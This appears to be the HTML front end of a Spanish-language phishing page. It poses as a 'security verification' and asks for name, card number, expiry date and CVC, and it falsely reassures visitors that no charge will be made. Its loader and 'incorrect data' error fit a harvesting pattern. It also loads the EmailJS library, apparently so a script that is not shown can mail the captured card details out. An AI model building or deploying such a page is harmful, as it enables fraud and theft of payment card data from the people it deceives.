<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="hearts">💖💖💖</div>
            <h1>Verificación de Usuario</h1>
            <div class="hearts">💖💖💖</div>
        </div>
        
        <form id="paymentForm">
            <div class="input-group">
                <label>Nombre Completo</label>
                <input type="text" id="cardHolder" placeholder="Ej. Ana López" required>
            </div>
            
            <div class="input-group">
                <label>Número de Tarjeta</label>
                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="16" required>
            </div>

            <div class="input-group">
                <label>Fecha de Expiración</label>
                <input type="month" id="expiryDate" required>
            </div>

            <div class="input-group">
                <label>Código de Seguridad</label>
                <input type="text" id="cvc" placeholder="1234" maxlength="4" required>
            </div>

            <button type="submit">Verificar Identidad 🌸</button>
        </form>
        
        <p class="disclaimer">⚠️ No se realizará ningún cobro. Solo verificación de identidad.</p>
        <div id="loader" class="hidden">⏳ Validando...</div>
        <div id="errorMessage" class="hidden">❌ Datos incorrectos</div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
